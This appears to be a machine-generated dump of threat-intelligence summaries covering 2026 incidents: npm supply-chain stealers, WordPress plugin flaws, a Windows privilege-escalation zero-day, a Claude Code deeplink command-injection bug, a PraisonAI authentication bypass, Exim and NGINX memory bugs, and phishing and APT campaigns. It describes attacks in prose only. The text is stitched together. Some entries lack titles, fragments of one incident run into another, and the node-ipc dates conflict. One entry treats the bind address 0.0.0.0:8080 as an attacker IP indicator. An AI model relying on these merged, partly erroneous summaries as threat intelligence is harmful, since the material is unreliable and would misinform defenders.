Title: Supply Chain Attack via Malicious npm Packages

Victim.Description: Users and organizations that downloaded the malicious npm packages.

diamond_model_summary: The incident involves a single adversary, 'deadcode09284814', who used open-source malware to conduct a supply chain attack via npm packages. The adversary's capability includes deploying the Shai-Hulud worm and Phantom Bot for information stealing and DDoS attacks. The infrastructure involves multiple C2 servers for data exfiltration. Victims are users and organizations that downloaded the malicious packages, with high impact severity due to the theft of sensitive information.
doc_summary: Cybersecurity researchers discovered four malicious npm packages containing information-stealing malware. One package, 'chalk-tempalte', is a clone of the Shai-Hulud worm leaked by TeamPCP. The packages were published by 'deadcode09284814' and include 'axois-utils', which delivers a Golang-based DDoS botnet called Phantom Bot. The packages siphon SSH keys, environment variables, cloud credentials, system information, IP addresses, and cryptocurrency wallet data to remote servers. The attack highlights the growing threat of supply chain attacks and typo-squatting in the npm ecosystem. Users are advised to uninstall the packages, delete malicious configurations, rotate secrets, and block suspicious domains.
kill_chain_summary: The attack follows a structured kill chain starting with reconnaissance to identify npm packages for cloning. Weaponization involved using the Shai-Hulud worm and Phantom Bot. Delivery was executed through npm package downloads. Exploitation targeted the npm ecosystem. Installation involved persistence mechanisms on compromised systems. Command and control were established via C2 servers. Actions on objectives included data exfiltration and DDoS attacks.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses and domain names used for C2 communication, as well as the tools Phantom Bot and Shai-Hulud worm. These indicators are crucial for detection and response efforts. The adversary's use of open-source malware and typo-squatting techniques highlights the need for vigilance in monitoring npm package downloads and network traffic.

Title: Avada Builder Plugin Vulnerabilities Expose WordPress Sites

Victim.Description: WordPress sites using the Avada Builder plugin.
Victim.Security_Posture: Vulnerable due to outdated plugin versions.

diamond_model_summary: The incident involves vulnerabilities in the Avada Builder plugin, affecting over one million WordPress sites. The adversary could be any attacker exploiting these vulnerabilities, with the capability to perform arbitrary file reads and SQL injections. The infrastructure includes WordPress sites using the vulnerable plugin, and the victims are site administrators and users. The attack highlights the importance of timely patching and security monitoring.
doc_summary: The Avada Builder plugin, used by over one million WordPress sites, was found to have two critical vulnerabilities: an arbitrary file read flaw (CVE-2026-4782) and a SQL injection vulnerability (CVE-2026-4798). Discovered by Rafie Muhammad through the Wordfence Bug Bounty Program, these vulnerabilities allow both authenticated and unauthenticated attackers to compromise affected sites. The file read flaw affects versions up to 3.15.2, allowing attackers to read sensitive files like wp-config.php. The SQL injection flaw impacts versions up to 3.15.1, enabling time-based SQL injection attacks. Wordfence released firewall protections, and Avada issued patches in versions 3.15.2 and 3.15.3. Administrators are urged to update to version 3.15.3 to prevent data theft and site compromise.
kill_chain_summary: The attack begins with reconnaissance, where attackers identify WordPress sites using vulnerable versions of the Avada Builder plugin. Exploitation occurs through arbitrary file read and SQL injection vulnerabilities, allowing attackers to access sensitive data. The attack's objectives include data theft and potential site compromise. Detection involves monitoring for unusual file access and SQL queries, while remediation requires updating the plugin and implementing security controls.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes TTPs such as arbitrary file read and SQL injection, which are challenging to change once detected. No specific hash values, IP addresses, or domain names are identified, but monitoring for these TTPs can help detect similar attacks. The incident underscores the need for robust detection and response capabilities to mitigate the impact of such vulnerabilities.

Title: Analysis of Fast16 Malware Targeting Nuclear Weapon Simulations

Victim.Description: The primary targets are nuclear weapons research facilities using LS-DYNA and AUTODYN software.

diamond_model_summary: The Fast16 incident involves a nation-state actor, likely the Equation Group, targeting nuclear weapons research through sophisticated malware. The malware, Fast16, is designed to tamper with specific simulation software, indicating a high level of domain knowledge and strategic intent to disrupt nuclear weapon development processes.
doc_summary: Fast16 is a Lua-based malware identified as a cyber sabotage tool targeting nuclear weapons testing simulations. Developed before Stuxnet, it was designed to corrupt uranium-compression simulations crucial for nuclear weapon design. Symantec and Carbon Black confirmed its targeting of LS-DYNA and AUTODYN applications, used for high-explosive simulations. The malware activates when material density exceeds 30 g/cm³, indicating uranium under implosion. Fast16's development dates back to 2005, predating Stuxnet by two years. Evidence links it to the Equation Group, with ties to the United States NSA. The malware features 101 hook rules, categorized into 9-10 groups, targeting different software versions. It avoids infection on systems with specific security products and spreads across networks. The incident highlights early nation-state industrial sabotage efforts.
kill_chain_summary: The Fast16 malware follows a structured kill chain, with weaponization involving the development of targeted malware to disrupt nuclear simulations. The actions on objectives stage is critical, where the malware activates under specific conditions to tamper with simulation outputs, highlighting a strategic sabotage effort by nation-state actors.
pyramid_of_pain_summary: The Fast16 incident lacks specific indicators such as hashes or IP addresses, making it challenging to apply the Pyramid of Pain effectively. The focus is on the malware's behavior and its impact on nuclear simulations, which are difficult to detect and remediate without specific IOCs.

Title: MiniPlasma Zero-Day Vulnerability in Windows Cloud Files Mini Filter Driver

Victim.Description: All Windows systems potentially affected by the MiniPlasma vulnerability.

diamond_model_summary: The MiniPlasma vulnerability represents a significant threat due to its ability to escalate privileges to SYSTEM level on Windows systems. The adversary, Chaotic Eclipse, demonstrated high sophistication by identifying and weaponizing this zero-day flaw. The capability involves exploiting a race condition in the Cloud Files Mini Filter Driver. The infrastructure details remain unspecified, but the victim scope is broad, affecting all Windows systems globally. The incident highlights the need for vigilance and timely patching to mitigate such vulnerabilities.
doc_summary: Chaotic Eclipse, a security researcher, disclosed a Windows zero-day vulnerability named MiniPlasma affecting the Cloud Files Mini Filter Driver (cldflt.sys). This flaw allows privilege escalation to SYSTEM level on fully patched Windows systems. Originally reported by Google Project Zero's James Forshaw in September 2020, it was believed to be patched in December 2020 under CVE-2020-17103. However, Chaotic Eclipse found it remains unpatched. The vulnerability is a race condition in the HsmOsBlockPlaceholderAccess routine. Will Dormann confirmed MiniPlasma's effectiveness on Windows 11 with May 2026 updates, but not on Insider Preview Canary builds. Microsoft addressed a related flaw, CVE-2025-62221, in December 2025.
kill_chain_summary: The MiniPlasma incident follows a clear kill chain progression. Initially, the vulnerability was identified and weaponized by Chaotic Eclipse, who developed a PoC exploit. The exploitation stage involves leveraging the vulnerability to gain SYSTEM privileges on Windows systems. Actions on objectives include executing commands with elevated privileges. The incident underscores the importance of addressing vulnerabilities promptly to prevent exploitation. The lack of specific delivery and command and control stages suggests a focus on local exploitation rather than remote attacks.
pyramid_of_pain_summary: The MiniPlasma vulnerability presents a challenge at the higher levels of the Pyramid of Pain. The exploit itself is a zero-day, making it difficult to detect and mitigate without specific patches. The lack of specific indicators such as hashes, IP addresses, or domains further complicates detection efforts. The primary focus for defenders should be on understanding the TTPs associated with this vulnerability and implementing robust patch management practices. The incident highlights the critical need for proactive threat intelligence and vulnerability management to address such high-impact threats.

Title: Remote Code Execution Vulnerability in Claude Code via Crafted Deeplink

Victim.Description: Users of Claude Code, particularly those on macOS, were targeted.

diamond_model_summary: The incident involves an adversary exploiting a vulnerability in Claude Code's CLI parsing logic to execute arbitrary commands. The capability was demonstrated through crafted deeplink URLs, targeting users of Claude Code, particularly on macOS. The infrastructure used involved malicious deeplink URLs, and the victims were users of Claude Code, primarily in the technology sector. The attack highlights the importance of secure parsing practices to prevent such vulnerabilities.
doc_summary: A critical vulnerability in Claude Code allowed attackers to execute arbitrary system commands through a crafted deeplink URL, exploiting a flaw in the CLI parsing logic. The issue was discovered by security researcher Joernchen and has been patched in version 2.1.118. The vulnerability originated from the eagerParseCliFlag function, which improperly parsed configuration flags, allowing attackers to inject malicious JSON settings objects. This led to remote code execution on macOS systems when users clicked on malicious claude-cli:// links. The attack bypassed workspace trust dialogs, posing a significant threat to users who had cloned trusted repositories like anthropics/claude-code. The incident highlights the dangers of naive string parsing and underscores the importance of context-aware argument parsing to prevent injection vulnerabilities.
kill_chain_summary: The attack began with the weaponization of a crafted deeplink URL exploiting a CLI parsing flaw in Claude Code. The delivery stage involved sending the malicious URL to potential victims. Exploitation occurred when the victim clicked the link, triggering arbitrary command execution. The attack bypassed workspace trust dialogs, leading to actions on objectives, such as executing commands on the victim's system. The incident underscores the need for secure parsing and prompt patching of vulnerabilities.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the use of crafted deeplink URLs as a tool for exploitation. No specific hash values, IP addresses, or domains were identified. The primary TTP involved is the exploitation of a CLI parsing flaw, highlighting the need for secure parsing practices. The incident emphasizes the importance of context-aware argument parsing to prevent injection vulnerabilities.

Title: Tycoon2FA Phishing Kit Exploits Device-Code Phishing to Hijack Microsoft 365 Accounts

Victim.Description: Targets are users of Microsoft 365 services, potentially across various industries.

diamond_model_summary: The Tycoon2FA phishing kit represents a sophisticated adversary employing advanced phishing techniques to compromise Microsoft 365 accounts. The adversary uses Trustifi click-tracking URLs and Cloudflare Workers to deliver phishing emails, tricking victims into granting OAuth tokens to attacker-controlled devices. The infrastructure includes obfuscated JavaScript layers and legitimate-looking phishing pages. Victims are primarily users of Microsoft 365 services, with a high impact severity due to unauthorized access to sensitive data.
doc_summary: The Tycoon2FA phishing kit has been observed exploiting device-code phishing attacks to compromise Microsoft 365 accounts. It abuses Trustifi click-tracking URLs to trick victims into granting OAuth tokens to attacker-controlled devices. Despite a law enforcement operation in March, the operation quickly resumed, adding new obfuscation layers. The attack involves an invoice-themed phishing email with a Trustifi tracking URL, redirecting through Cloudflare Workers and obfuscated JavaScript layers to a fake Microsoft CAPTCHA page. The phishing page retrieves a Microsoft OAuth device code, instructing victims to enter it at microsoft.com/devicelogin, leading to unauthorized access to the victim's data. eSentire's research highlights the kit's extensive protection against security tools and recommends disabling OAuth device code flow, restricting OAuth consent permissions, and monitoring Entra logs for suspicious activity.
kill_chain_summary: The Tycoon2FA phishing attack follows a structured kill chain, starting with reconnaissance through phishing emails, weaponization with obfuscated JavaScript and Trustifi URLs, and delivery via phishing emails. Exploitation occurs when victims enter device codes on legitimate Microsoft pages, leading to installation of OAuth tokens on attacker-controlled devices. Command and control is achieved through unauthorized access to compromised accounts, and actions on objectives involve data access and exfiltration. The attack demonstrates a high level of sophistication and evasion tactics.
pyramid_of_pain_summary: The Tycoon2FA phishing kit presents significant challenges for defenders, with a focus on evasion and obfuscation. The pyramid of pain includes domain names like microsoft.com/devicelogin, tools such as Trustifi and Cloudflare Workers, and TTPs involving device-code phishing and OAuth token hijacking. The attack's sophistication and use of legitimate services make detection and mitigation difficult, emphasizing the need for advanced security measures and continuous monitoring.

Successful exploitation allows unauthenticated attackers to crash worker processes or execute remote code, particularly when ASLR is disabled. Victim.Description: Linux systems running unpatched kernels with privileged processes.

diamond_model_summary: The ssh-keysign-pwn vulnerability represents a significant threat to Linux systems globally. The adversary, potentially any local user with standard privileges, can exploit a race condition in the Linux kernel to access sensitive SSH private keys and hashed passwords. doc_summary: A critical vulnerability in the Linux kernel, identified as CVE-2026-46333 and dubbed ssh-keysign-pwn, exposes millions of systems to unauthorized access. The flaw, a race condition in the __ptrace_may_access() function, allows unprivileged local attackers to access sensitive SSH private keys and hashed passwords in /etc/shadow. This vulnerability, existing undetected for six years, affects major Linux distributions like Ubuntu, Debian, and CentOS. Exploitation does not require elevated privileges, and a proof-of-concept exploit is publicly available. The vulnerability's impact includes impersonation attacks and offline password cracking. Linux kernel maintainers have released patches, and immediate updates are recommended.
kill_chain_summary: The ssh-keysign-pwn vulnerability follows a clear kill chain path. Exploitation occurs through a race condition in the Linux kernel, allowing local attackers to gain initial access to sensitive data. The lack of required elevated privileges simplifies the attack, enabling actions on objectives such as credential dumping and potential impersonation. Detection involves monitoring access to sensitive files and auditing ptrace permissions. Remediation requires immediate patching of affected systems and implementing strong access controls. The vulnerability's public disclosure and available proof-of-concept exploit increase the urgency for mitigation.

However, the vulnerability's reliance on a specific kernel function and process behavior provides opportunities for detection through behavioral analysis. Remediation focuses on patching and access control, addressing the root cause of the vulnerability. The critical nature of the vulnerability necessitates immediate action to protect affected systems.

doc_summary: In October 2023, a supply chain attack targeted the node-ipc package, a popular Node.js module for inter-process communication. The attack leveraged a compromised account of an inactive maintainer named 'atiertant'. The malware uses a fake Azure-themed domain for command and control, avoiding conventional HTTP-based traffic. Developers are advised to remove affected versions, rotate credentials, and inspect npm caches. The attack highlights vulnerabilities in software supply chains and the need for robust security practices.

Title: Exploitation of Vulnerability in Funnel Builder Plugin for WordPress

Victim.Description: E-commerce websites using the Funnel Builder plugin for WordPress.
Victim.Security_Posture: Vulnerable due to outdated plugin versions

diamond_model_summary: The incident involves a financially motivated adversary exploiting a vulnerability in the Funnel Builder plugin for WordPress. The adversary uses JavaScript injection to compromise WooCommerce checkout pages, aiming to skim payment card information. The infrastructure includes domains like analytics-reports[.]com and protect-wss[.]com, used for command and control. Victims are e-commerce platforms using the vulnerable plugin, with high impact severity due to potential financial losses.
doc_summary: A critical vulnerability in the Funnel Builder plugin for WordPress is being actively exploited to inject malicious JavaScript snippets into WooCommerce checkout pages. The flaw affects all versions of the plugin before 3.15.0.3 and can be leveraged without authentication. Funnel Builder, developed by FunnelKit, is used to customize checkout pages with features like one-click upsells and landing pages. The payload, disguised as a fake Google Tag Manager/Google Analytics script, opens a WebSocket connection to an external location. An attacker can exploit it to modify the plugin’s global settings via an unprotected checkout endpoint, injecting arbitrary JavaScript into the plugin’s “External Scripts” setting. This results in the execution of malicious code on every checkout page. The attacker-controlled server delivers a customized payment card skimmer that steals payment information. FunnelKit addressed the vulnerability in version 3.15.0.3. A security advisory from the vendor confirms the malicious activity and recommends updating to the latest version and reviewing settings for rogue scripts.
kill_chain_summary: The adversary conducts reconnaissance to identify vulnerable WordPress sites using the Funnel Builder plugin. They weaponize a malicious JavaScript payload disguised as a Google Tag Manager script. The payload is delivered via an unprotected checkout endpoint, exploiting the vulnerability to inject the script into the plugin’s settings. The script establishes a WebSocket connection to an adversary-controlled server, enabling the skimming of payment card information from checkout pages.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes domain names like analytics-reports[.]com and protect-wss[.]com, which are critical for the adversary's command and control operations. The use of JavaScript and WebSocket protocols are tools and techniques employed by the adversary. Detection and disruption of these indicators can significantly impact the adversary's operations, as they rely on these elements for successful exploitation and data exfiltration.

Title: Turla's Kazuar Backdoor Transformed into Modular P2P Botnet

Victim.Description: Targets include government, diplomatic, and defense sectors in Europe and Central Asia.

diamond_model_summary: Turla, a Russian state-sponsored group, has upgraded its Kazuar backdoor into a modular P2P botnet. This evolution enhances stealth and persistence, aligning with their strategic objective of long-term system access for intelligence collection. The infrastructure includes a modular botnet with Kernel, Worker, and Bridge modules, facilitating flexible configuration and task management. Victims are primarily in the government, diplomatic, and defense sectors in Europe and Central Asia.
doc_summary: The Russian state-sponsored hacking group Turla has upgraded its Kazuar backdoor into a modular peer-to-peer botnet for stealth and persistent access. Turla, linked to Russia's FSB, targets government, diplomatic, and defense sectors in Europe and Central Asia. The Kazuar backdoor, used since 2017, now features a modular architecture with Kernel, Worker, and Bridge modules. These modules enable flexible configuration, reduce observable footprint, and facilitate broad tasking. The Kernel module manages communication and task assignment, while the Worker module handles data aggregation and exfiltration. The upgrade aligns with Secret Blizzard's objective of long-term system access for intelligence collection. The malware uses droppers like Pelmeni and ShadowLoader for module deployment. Kazuar's design allows decoupling of task execution from data storage and exfiltration, maintaining operational state across restarts.
kill_chain_summary: The Kazuar backdoor's transformation into a modular P2P botnet involves several stages of the MITRE ATT&CK kill chain. Delivery is achieved through droppers like Pelmeni and ShadowLoader. Installation involves deploying the modular architecture with Kernel, Worker, and Bridge modules. Command and Control is maintained through multiple communication protocols, including Windows Messaging and WebSockets. The primary objective is intelligence collection through long-term system access.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes several indicators. Tools like Kazuar, Pelmeni, and ShadowLoader are used, along with TTPs such as modular botnet architecture and living-off-the-land binaries (LOLBins). These indicators are crucial for detection and response efforts. The modular design of Kazuar reduces its observable footprint, making detection challenging. Effective monitoring and analysis of network traffic and endpoint activities are essential for identifying and mitigating this threat.

Title: OpenClaw Vulnerabilities Exploited for Data Theft and Persistence

Victim.Description: Users of OpenClaw software

diamond_model_summary: The incident involves exploitation of OpenClaw vulnerabilities, collectively named Claw Chain, allowing attackers to achieve data theft, privilege escalation, and persistence. The adversary exploits CVE-2026-44112, CVE-2026-44113, and CVE-2026-44118 to tamper with configurations and plant backdoors. The vulnerabilities have been addressed in OpenClaw version 2026.4.22.
doc_summary: Cybersecurity researchers have identified four security flaws in OpenClaw, collectively named Claw Chain by Cyera. These vulnerabilities, CVE-2026-44112, CVE-2026-44113, and CVE-2026-44118, allow attackers to achieve data theft, privilege escalation, and persistence. The flaws enable attackers to tamper with configurations, plant backdoors, and read sensitive system files. OpenClaw's senderIsOwner flag, which is client-controlled, is a root cause of CVE-2026-44118. The vulnerabilities have been addressed in OpenClaw version 2026.4.22, with security researcher Vladimir Tokarev credited for the discovery. Users are advised to update to the latest version to mitigate potential threats.

Title: Critical Authentication Bypass Vulnerability in PraisonAI Legacy API Server

Victim.Description: Organizations using PraisonAI versions 2.5.6 through 4.6.33.

diamond_model_summary: The incident involves a critical vulnerability in PraisonAI's legacy API server, allowing attackers to bypass authentication and execute AI workflows without credentials. The adversary is likely opportunistic, exploiting insecure defaults in AI platforms. The infrastructure includes exposed API servers, and the victims are organizations using vulnerable PraisonAI versions. The capability involves exploiting CVE-2026-44338, with the potential impact being unauthorized access to sensitive data and AI workflows.
doc_summary: A high-severity vulnerability in PraisonAI, tracked as CVE-2026-44338, exposes a critical authentication bypass in the platform's legacy API server. This flaw allows attackers to execute AI workflows without credentials, affecting versions 2.5.6 through 4.6.33. The root cause is a legacy Flask-based API server with authentication disabled by default, hard-coding AUTH_ENABLED = False and AUTH_TOKEN = None. The server binds to 0.0.0.0:8080, making it accessible over the network. Attackers can abuse endpoints like GET /agents and POST /chat, executing workflows defined in agents.yaml. The vulnerability has been fixed in version 4.6.34. Users are advised to upgrade immediately or apply mitigation steps such as restricting network access and enabling authentication mechanisms. This incident highlights the risk of AI platforms shipping with insecure defaults, making them targets for attackers.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where attackers identify exposed PraisonAI API servers with default configurations. Exploitation follows, as attackers leverage the authentication bypass vulnerability (CVE-2026-44338) to gain unauthorized access. The actions on objectives stage involves executing AI workflows and accessing sensitive data. Detection focuses on monitoring unauthorized API access, while remediation includes upgrading to a patched version and implementing secure configurations.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses (0.0.0.0:8080) and TTPs related to exploiting public-facing applications. The lack of specific hashes, domains, or tools limits the ability to apply higher-level indicators. The focus is on securing infrastructure and monitoring for unauthorized access to mitigate the impact of the vulnerability.

doc_summary: Pwn2Own Berlin 2026 saw security researchers earning $523,000 by exploiting 24 zero-day vulnerabilities. Orange Tsai achieved a sandbox escape on Microsoft Edge, earning $175,000. Other notable exploits included k3vg3n's $40,000 reward for chaining three bugs, and $20,000 for exploiting NVIDIA Megatron Bridge zero-days. The DEVCORE Research Team led with $205,000 in total earnings. Vendors have 90 days to release security fixes for disclosed zero-day flaws.

Title: Cisco Catalyst SD-WAN Controller Authentication Bypass Exploited in Zero-Day Attacks

Victim.Description: Organizations using Cisco Catalyst SD-WAN Controllers in on-prem and cloud environments.

diamond_model_summary: The incident involves a critical vulnerability, CVE-2026-20182, in Cisco Catalyst SD-WAN Controllers, exploited by threat actors to gain unauthorized access and manipulate network configurations. The adversary's capability includes exploiting zero-day vulnerabilities, with the infrastructure being compromised SD-WAN Controllers. Victims are organizations using these controllers, primarily in the technology sector.
doc_summary: Cisco has identified a critical vulnerability, CVE-2026-20182, in its Catalyst SD-WAN Controller, which has been actively exploited in zero-day attacks. This flaw allows attackers to bypass authentication and gain administrative privileges on affected devices. The vulnerability, with a severity rating of 10.0, affects both on-premises and cloud deployments of Cisco Catalyst SD-WAN Controller and Manager. The issue arises from a malfunctioning peering authentication mechanism, enabling attackers to send crafted requests to the system. Successful exploitation grants access to NETCONF, allowing manipulation of network configurations. Cisco detected exploitation in May but has not disclosed specific attack details. Indicators of compromise include unauthorized peering events in SD-WAN Controller logs. Cisco has released security updates to address the flaw and recommends restricting access to management interfaces and reviewing logs for suspicious activity. CISA has mandated federal agencies to patch affected devices by May 17, 2026.
kill_chain_summary: The attack begins with the exploitation of CVE-2026-20182, allowing unauthorized access to Cisco SD-WAN Controllers. The adversary uses this access to manipulate network configurations via NETCONF, potentially establishing command and control. Detection involves monitoring logs for unauthorized access and peering events, while remediation includes applying security patches and restricting access to management interfaces.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the exploitation of CVE-2026-20182, a zero-day vulnerability, as a significant TTP. Detection focuses on monitoring unauthorized access and peering events in SD-WAN Controller logs. Remediation involves applying security patches and restricting access to management interfaces, addressing the critical severity of the vulnerability.

Title: Critical Vulnerability CVE-2026-42945 in NGINX Discovered by DepthFirst AI

Victim.Description: Organizations using vulnerable NGINX configurations.

diamond_model_summary: The incident involves a critical vulnerability in NGINX, discovered by DepthFirst AI, which can lead to denial of service and potential remote code execution. The flaw is due to a heap buffer overflow in the ngx_http_rewrite_module, affecting NGINX versions 0.6.27 through 1.30.0. The vulnerability is easier to exploit due to NGINX's multi-process architecture, allowing repeated attempts without changing memory layout. The flaw was demonstrated with ASLR disabled, a condition not common in default deployments.
doc_summary: An 18-year-old flaw in the NGINX open-source web server, tracked as CVE-2026-42945, was discovered by DepthFirst AI. This critical vulnerability, with a CVSS score of 9.2, can lead to denial of service and potentially remote code execution. The flaw affects NGINX versions 0.6.27 through 1.30.0 and is due to inconsistent state handling in the ngx_http_rewrite_module. Exploitation requires specific NGINX configurations using 'rewrite' and 'set' directives. The vulnerability was reported on April 21, 2026, and patches were released for NGINX Open Source 1.31.0 and 1.30.1. While some researchers question the real-world exploitability, the denial-of-service potential is significant. The flaw's exploitation is easier due to NGINX's multi-process architecture, which allows repeated attempts without changing memory layout. The vulnerability was demonstrated with ASLR disabled, a condition not common in default deployments.

diamond_model_summary: The incident involves the republishing of malicious code into the Node-IPC package, affecting developers globally. The infrastructure leverages DNS for data exfiltration, posing a high risk to the software development sector.
doc_summary: Cybersecurity researchers have identified malicious activity in the Node-IPC NPM package, specifically in versions 9.1.6, 9.2.3, and 12.0.1. The package contains obfuscated stealer/backdoor behavior, which fingerprints the host environment, reads local files, compresses data, and attempts exfiltration through a network endpoint. The payload is triggered at runtime and targets developer and cloud secrets. This incident follows a previous event in March 2022, where the package was used for protest by overwriting files in Russia and Belarus. The current incident involves republishing malicious code rather than a typosquatting attempt.
kill_chain_summary: The attack begins with the weaponization of the Node-IPC package through obfuscation, followed by delivery via the NPM repository. Installation occurs when the package is required at runtime, leading to command and control through DNS-based exfiltration. The final objective is the exfiltration of developer and cloud secrets, highlighting the need for vigilant monitoring and remediation.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes obfuscated code patterns and DNS-based exfiltration techniques. While specific hashes, IPs, and domains are not identified, the use of obfuscation and data exfiltration tactics presents significant challenges for detection and response. The incident underscores the importance of monitoring for behavioral indicators and implementing robust security measures.

Title: Ghostwriter's Spear-Phishing Campaign Against Ukrainian Government Entities

Victim.Description: Ukrainian governmental organizations targeted by Ghostwriter's spear-phishing campaign.

diamond_model_summary: The Ghostwriter threat group, also known as FrostyNeighbor, has been conducting spear-phishing campaigns against Ukrainian governmental organizations. The group uses sophisticated techniques, including dynamic CAPTCHA checks and geofencing, to evade detection. Their primary objective is cyber espionage, targeting sensitive governmental data.
doc_summary: The Belarus-aligned threat group Ghostwriter, also known as FrostyNeighbor, has been targeting Ukrainian governmental organizations since March 2026. The group has been active since 2016, engaging in cyber espionage and influence operations. Recent attacks involve spear-phishing campaigns using malicious PDFs impersonating Ukrtelecom to deliver a JavaScript version of PicassoLoader, which subsequently drops Cobalt Strike. The infection sequence includes geofencing checks to serve benign PDFs to non-Ukrainian IP addresses. Ghostwriter has previously exploited vulnerabilities such as CVE-2023-38831 in WinRAR and CVE-2024-42009 in Roundcube. The group's activities are primarily focused on military and governmental sectors in Ukraine, with broader targeting in Poland and Lithuania. ESET reports highlight Ghostwriter's operational maturity and adaptive tactics, including dynamic CAPTCHA checks and server-side victim validation.
kill_chain_summary: Ghostwriter's attack chain involves reconnaissance to identify targets, weaponization of spear-phishing emails with malicious PDFs, delivery to Ukrainian government entities, exploitation of vulnerabilities in WinRAR and Roundcube, installation of PicassoLoader and Cobalt Strike, command and control operations, and actions on objectives such as harvesting email credentials.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes various indicators such as malware hashes (PicassoLoader, Cobalt Strike), IP addresses used for geofencing, and domain names impersonating Ukrtelecom. The use of dynamic CAPTCHA checks and geofencing adds complexity to detection and response efforts, highlighting the sophistication of Ghostwriter's tactics.

Title: Exploitation of CVE-2026-44338 in PraisonAI Framework

Victim.Description: Users of PraisonAI framework with exposed legacy Flask API server.
Victim.Security_Posture: Vulnerable due to default authentication settings

diamond_model_summary: The incident involves threat actors exploiting CVE-2026-44338 in the PraisonAI framework. The adversary used a tool named CVE-Detector/1.0 to scan for vulnerable endpoints. The infrastructure involved an IP address 146.190.133.49 probing internet-exposed instances. Victims are users of PraisonAI with exposed legacy Flask API servers.
doc_summary: Threat actors have been observed attempting to exploit a recently disclosed security vulnerability in PraisonAI, an open-source multi-agent orchestration framework, within four hours of public disclosure. The vulnerability, CVE-2026-44338, involves missing authentication that exposes sensitive endpoints, allowing attackers to invoke the API server's protected functionality without a token. The flaw affects all versions of the Python package from 2.5.6 through 4.6.33 and has been patched in version 4.6.34. Security researcher Shmulik Cohen discovered the bug. Sysdig reported that within three hours and 44 minutes of the advisory becoming public, a scanner identifying as CVE-Detector/1.0 probed the vulnerable endpoint on internet-exposed instances. The activity originated from IP address 146.190.133.49, with two passes spaced eight minutes apart. The first pass scanned generic disclosure paths, while the second targeted AI-agent surfaces, including PraisonAI. The rapid exploitation highlights a trend where threat actors quickly adopt newly disclosed flaws. Users are advised to apply the latest fixes, audit deployments, review billing for suspicious activity, and rotate credentials in agents.yaml.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where the adversary used CVE-Detector/1.0 to scan for vulnerable endpoints. Exploitation followed, with the adversary leveraging CVE-2026-44338 to bypass authentication on PraisonAI's legacy Flask API server. The rapid exploitation underscores the need for timely patching and monitoring.

Title: Critical Authentication Bypass in WordPress Burst Statistics Plugin

Victim.Description: Websites using the Burst Statistics plugin

diamond_model_summary: The incident involves a critical vulnerability in the Burst Statistics plugin for WordPress, allowing attackers to bypass authentication and gain admin access. The flaw affects over 200,000 websites and was discovered by Wordfence using AI-driven tools. The vulnerability was quickly patched, but the ease of exploitation poses a significant risk.
doc_summary: A critical vulnerability in the Burst Statistics plugin for WordPress, tracked as CVE-2026-8181, has exposed over 200,000 websites to potential takeover. The flaw, discovered by Wordfence using their AI-driven PRISM platform, allows attackers to gain administrator-level access without valid credentials. The vulnerability affects versions 3.4.0 through 3.4.1.1 and was introduced on April 23, 2026. It stems from improper validation of authentication results in the plugin’s MainWP integration, allowing unauthenticated attackers to craft malicious HTTP requests using a known administrator username. Wordfence deployed firewall rules for premium users on May 8, 2026, and the plugin developer released a patched version 3.4.2 on May 12, 2026. The flaw significantly lowers the barrier to exploitation, increasing the likelihood of mass scanning and automated attacks.
kill_chain_summary: The attack begins with reconnaissance to identify vulnerable WordPress sites using the Burst Statistics plugin. Exploitation occurs through an authentication bypass, allowing attackers to gain admin access without valid credentials. The attackers can then create new admin accounts to maintain control over the site, posing a critical threat.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the CVE-2026-8181 vulnerability as a TTP. No specific hashes, IP addresses, or domains were identified. diamond_model_summary: The Exim CVE-2026-45185 vulnerability, known as 'Dead.Letter', represents a significant threat to mail servers using GnuTLS. The adversary's capability involves exploiting a use-after-free vulnerability in Exim's BDAT message body parsing logic. The infrastructure at risk includes Exim mail servers running vulnerable versions with GnuTLS. Victims are organizations using Exim, particularly those in the Information Technology and Telecommunications sectors. The potential impact is high, with the possibility of unauthorized access to email communications and infrastructure.
doc_summary: CVE-2026-45185, also known as 'Dead.Letter', is a critical vulnerability in the Exim mail transfer agent affecting versions 4.97 through 4.99.2 when built with GnuTLS. This use-after-free vulnerability allows unauthenticated remote code execution by exploiting Exim's handling of TLS-encrypted SMTP traffic and BDAT chunked message bodies. The flaw is triggered by sending a crafted sequence of SMTP commands that mix TLS shutdown with BDAT chunk processing. Successful exploitation can lead to complete mail server compromise, including reading or tampering with emails and deploying malware. Exim 4.99.3 includes a fix, and administrators are advised to upgrade or apply mitigations such as switching to OpenSSL or disabling BDAT/CHUNKING support.
kill_chain_summary: The Exim CVE-2026-45185 vulnerability follows a kill chain involving weaponization, exploitation, and actions on objectives. The adversary crafts exploit code targeting the use-after-free vulnerability in Exim's BDAT message body parsing logic. Exploitation occurs when the crafted SMTP command sequence triggers memory corruption, leading to remote code execution. Actions on objectives include unauthorized access to email communications, lateral movement, and potential deployment of malware. Detection and remediation efforts focus on monitoring SMTP traffic, upgrading to patched versions, and applying configuration changes.
pyramid_of_pain_summary: The Pyramid of Pain for the Exim CVE-2026-45185 vulnerability includes indicators such as crafted SMTP command sequences and memory corruption attempts. Title: KongTuke's Microsoft Teams Social Engineering Campaign

Victim.Description: Corporate networks targeted via Microsoft Teams.

diamond_model_summary: KongTuke, an initial access broker, has adapted its tactics to use Microsoft Teams for social engineering attacks. The adversary employs Unicode whitespace tricks to impersonate IT staff, convincing victims to execute a PowerShell command that delivers ModeloRAT malware. This campaign marks a shift from web-based lures to collaboration platforms, highlighting the adversary's adaptability and sophistication. The infrastructure involves Microsoft Teams and Dropbox, with the victim being corporate networks globally. The capability includes social engineering, PowerShell execution, and persistence through scheduled tasks.
